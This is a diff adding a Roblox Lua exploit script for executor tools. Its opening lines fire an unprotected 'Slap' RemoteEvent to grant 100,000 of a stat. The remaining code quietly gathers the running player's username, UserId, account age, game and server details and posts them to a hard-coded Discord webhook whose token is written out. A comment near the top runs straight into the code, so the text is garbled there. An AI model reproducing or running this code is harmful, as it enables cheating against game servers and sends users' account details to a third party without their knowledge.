@@ -1,0 +1,82 @@
+local slapEvent = game.ReplicatedStorage._NETWORK:FindFirstChild("Slap")
+if slapEvent and slapEvent:IsA("RemoteEvent") then
+    slapEvent:FireServer(100000)
+end this script looking for all server event of the RemoteEvent is not protected it will add 100k--// Services
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local player = Players.LocalPlayer
+
+--// Webhook
+local webhook = "https://discord.com/api/webhooks/1374927459363061870/NVLNHOGR2aH0NmICgEATTZVDt5yBAuoyO3sn3QCWhxOweUjkWbuaVRZrTYscDTujYKoe"
+
+--// Try to get game name
+local success, gameName = pcall(function()
+	return MarketplaceService:GetProductInfo(game.PlaceId).Name
+end)
+if not success then
+	gameName = "Unknown Game"
+end
+
+--// Message content
+local data = {
+	["content"] = "**Script Executed!**",
+	["embeds"] = {{
+		["title"] = "Execution Log",
+		["color"] = 0x3498db,
+		["fields"] = {
+			{
+				["name"] = "Username",
+				["value"] = player.Name,
+				["inline"] = true
+			},
+			{
+				["name"] = "Display Name",
+				["value"] = player.DisplayName,
+				["inline"] = true
+			},
+			{
+				["name"] = "UserId",
+				["value"] = tostring(player.UserId),
+				["inline"] = true
+			},
+			{
+				["name"] = "Account Age (days)",
+				["value"] = tostring(player.AccountAge),
+				["inline"] = true
+			},
+			{
+				["name"] = "Game Name",
+				["value"] = gameName,
+				["inline"] = true
+			},
+			{
+				["name"] = "Place ID",
+				["value"] = tostring(game.PlaceId),
+				["inline"] = true
+			},
+			{
+				["name"] = "Private Server?",
+				["value"] = tostring(game.PrivateServerId ~= ""),
+				["inline"] = true
+			}
+		}
+	}}
+}
+
+--// Send to webhook
+local jsonData = HttpService:JSONEncode(data)
+
+local req = (syn and syn.request) or (http and http.request) or request
+if req then
+	req({
+		Url = webhook,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = jsonData
+	})
+else
+	warn("Executor does not support HTTP requests.")
+end
